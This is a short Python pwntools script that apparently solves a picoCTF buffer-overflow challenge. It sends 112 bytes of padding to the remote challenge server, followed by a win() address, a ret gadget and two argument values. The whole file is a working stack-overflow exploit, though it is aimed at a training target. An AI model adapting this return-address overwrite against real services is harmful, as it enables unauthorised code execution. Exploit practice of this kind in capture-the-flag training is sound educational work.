from pwn import *

p = remote('saturn.picoctf.net', 65423)
elf = ELF('./vuln')

offset = 112
junk = b'A' * offset

payload = junk
payload += p32(0x08049296)	# win() function
payload += p32(0x08049009)	# ret gadget
payload += p32(0xCAFEF00D)	# first parameter win() function
payload += p32(0xF00DF00D)	# second parameter win() function

p.sendline(payload)
p.interactive()
